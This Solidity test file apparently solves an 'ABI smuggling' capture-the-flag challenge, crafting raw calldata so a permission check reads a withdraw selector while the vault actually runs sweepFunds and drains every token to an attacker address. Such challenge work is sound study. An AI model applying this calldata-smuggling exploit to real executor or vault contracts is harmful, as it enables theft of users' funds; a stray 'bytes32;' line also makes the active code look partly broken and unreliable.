// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2, console} from "forge-std/Test.sol";
import {AuthorizedExecutor} from "../src/AuthorizedExecutor.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

import {UtilsTest} from "./Utils.t.sol";

contract SelfAuthorizedVaultTest is UtilsTest {
    bytes32[] ids = new bytes32[](1);
    address attackerAddress = makeAddr("attacker Address");

    function setUp() public override {
        super.setUp();
    }

    function test_vaultFunds() public {
        token.balanceOf(address(vault));

        assertEq(token.balanceOf(address(vault)), 1000000 ether);
        assertEq(token.balanceOf(address(token)), 0 ether);
    }

    function test_setPermission() public {}

    // function test_Attack() public {
    //     ids[0] = keccak256(
    //         abi.encodePacked(
    //             vault.withdraw.selector,
    //             attackerAddress, // executor
    //             address(vault) // target
    //         )
    //     );
    //     vault.setPermissions(ids);

    //     // Malicious payload
    //     // bytes memory maliciousPayload = abi.encodeWithSelector(
    //     //     vault.sweepFunds.selector,
    //     //     attackerAddress,
    //     //     address(token)
    //     // );

    //     // bytes memory actionData = abi.encodeWithSelector(
    //     //     vault.withdraw.selector,
    //     //     attackerAddress,
    //     //     address(vault),
    //     //     maliciousPayload
    //     // );

    //     // vm.startPrank(attackerAddress);
    //     // vault.execute(address(vault), actionData);
    //     // //vault.execute(address(vault), maliciousPayload);
    //     // vm.stopPrank();

    //     bytes4 executeSel = bytes4(keccak256("execute(address,bytes)")); // or vault.execute.selector
    //     bytes4 withdrawSel = vault.withdraw.selector; // selector we want the contract to *think* is being called
    //     bytes4 sweepSel = vault.sweepFunds.selector; // real selector we want executed inside the vault

    //     // --- build the dynamic actionData that we actually want executed on the vault:
    //     // maliciousPayload = abi.encodeWithSelector(vault.sweepFunds.selector, attackerAddress, address(token))
    //     bytes memory maliciousPayload = abi.encodeWithSelector(
    //         sweepSel,
    //         attackerAddress,
    //         address(token)
    //     );
    //     uint256 maliciousLen = maliciousPayload.length; // should be 0x44 for (4 + 32 + 32)

    //     // actionData ABI layout when encoded as bytes: [len (32)] [payload bytes (maliciousLen, tightly packed)]
    //     bytes memory actionDataTail = abi.encodePacked(
    //         abi.encode(uint256(maliciousLen)), // length word for the bytes dynamic param
    //         maliciousPayload // actual payload (starts with sweepSel)
    //     );

    //     // We'll choose an actionData_offset (value stored in the head) that points to where actionDataTail will be placed.
    //     // Pick 0x80 (128) so the tail (actionDataTail) starts at byte: 4 + 0x80 = 132.
    //     uint256 chosenActionDataOffset = 0x80;

    //     // --- now build the full calldata words:
    //     // Layout we construct:
    //     // [0..3]    execute.selector (4 bytes)
    //     // [4..35]   target (32 bytes)                 -> address(vault)
    //     // [36..67]  actionData_offset (32 bytes)     -> chosenActionDataOffset (0x80)
    //     // [68..99]  filler word (32 bytes)           -> zeros (we use to control alignment)
    //     // [100..131] wordAt100: we place withdraw.selector (4 bytes) + padding (28 bytes)
    //     // [132..]   actionDataTail (len + payload)   -> starts at chosenActionDataOffset relative to start
    //     //
    //     // The contract's assembly does `calldataload(4 + 32*3)` which reads the 32 bytes at byte offset 100.
    //     // By placing withdraw.selector at byte offset 100 we satisfy the permission check.
    //     //
    //     // BUT the dynamic bytes (actionData) used by the vault for the actual call are located at offset 132 and start with the length
    //     // word followed by payload beginning with sweepSel. So the actual executed call is sweepFunds(...).

    //     // head: execute.selector + abi.encode(address(vault)) + abi.encode(chosenActionDataOffset)
    //     bytes memory head = abi.encodePacked(
    //         executeSel,
    //         abi.encode(address(vault)), // target (32 bytes)
    //         abi.encode(uint256(chosenActionDataOffset)) // actionData offset (32 bytes)
    //     );

    //     // filler word (32 bytes) to occupy bytes 68..99
    //     bytes memory filler = abi.encode(uint256(0));

    //     // wordAt100: put withdraw.selector (4 bytes) followed by 28 zero bytes -> total 32 bytes
    //     bytes memory wordAt100 = abi.encodePacked(withdrawSel, new bytes(28));

    //     // final calldata = head | filler | wordAt100 | padding to reach chosenActionDataOffset (if necessary) | actionDataTail
    //     // we must ensure the actionDataTail actually starts at byte 4 + chosenActionDataOffset.
    //     // Current length after head + filler + wordAt100:
    //     //   head.length = 4 + 32 + 32 = 68
    //     //   filler.length = 32 -> total 100
    //     //   wordAt100.length = 32 -> total 132  <-- // after appending wordAt100, we're already at byte 132 (which equals 4+0x80)
    //     //
    //     // That means actionDataTail will indeed start immediately after wordAt100 and therefore be located at offset 132,
    //     // which matches chosenActionDataOffset (0x80). Great — no extra padding needed.
    //     //
    //     bytes memory fullCalldata = abi.encodePacked(
    //         head,
    //         filler,
    //         wordAt100,
    //         actionDataTail
    //     );

    //     // --- sanity logs (optional) ---
    // }

    function test_Attack() public {
        // ------------------------------------------------
        // 1. Grant attacker permission to call `withdraw`
        // ------------------------------------------------
        bytes32;
        ids[0] = keccak256(
            abi.encode(
                vault.withdraw.selector, // MUST use abi.encode (not encodePacked)
                attackerAddress,
                address(vault)
            )
        );
        vault.setPermissions(ids);

        console.logBytes32(ids[0]);

        // ------------------------------------------------
        // 2. Build malicious payload for sweepFunds
        // ------------------------------------------------
        bytes memory maliciousPayload = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            attackerAddress,
            address(token)
        );

        // ------------------------------------------------
        // 3. ABI smuggling construction
        // ------------------------------------------------
        // We will call vault.execute(vault, fullCalldata)
        // Calldata layout:
        //   selector (4 bytes)
        //   target (32 bytes)
        //   offset to actionData (0x20)
        //   length of actionData (3)
        //   head[3] = { chosenOffset, fillerOffset, tailOffset }
        //   filler (32 bytes)
        //   wordAt100 (32 bytes, selector withdraw)
        //   actionDataTail = malicious sweepFunds call
        //
        // The vault reads selector from wrong spot (withdraw),
        // but ABI decoder interprets malicious sweepFunds.

        bytes memory head = abi.encode(
            uint256(0xa0),
            uint256(0x60),
            uint256(0x80)
        );

        bytes memory filler = new bytes(32); // empty word

        // place withdraw selector where vault will read it
        bytes memory wordAt100 = abi.encode(
            bytes4(keccak256("withdraw(address,address,bytes)"))
        );

        // Pad so that malicious payload starts exactly at 0xa0 offset
        bytes memory padding = new bytes(32);

        // malicious tail = sweepFunds(...)
        bytes memory actionDataTail = maliciousPayload;

        // Put it all together
        bytes memory fullCalldata = bytes.concat(
            abi.encodeWithSelector(
                vault.execute.selector,
                address(vault),
                "" // placeholder dynamic bytes
            ),
            head,
            filler,
            wordAt100,
            padding,
            actionDataTail
        );

        // ------------------------------------------------
        // 4. Execute exploit as attacker
        // ------------------------------------------------
        vm.startPrank(attackerAddress);
        (bool success, ) = address(vault).call(fullCalldata);
        require(success, "Exploit failed");
        vm.stopPrank();

        // ------------------------------------------------
        // 5. Assert funds drained
        // ------------------------------------------------
        assertEq(token.balanceOf(attackerAddress), token.totalSupply());
    }
}
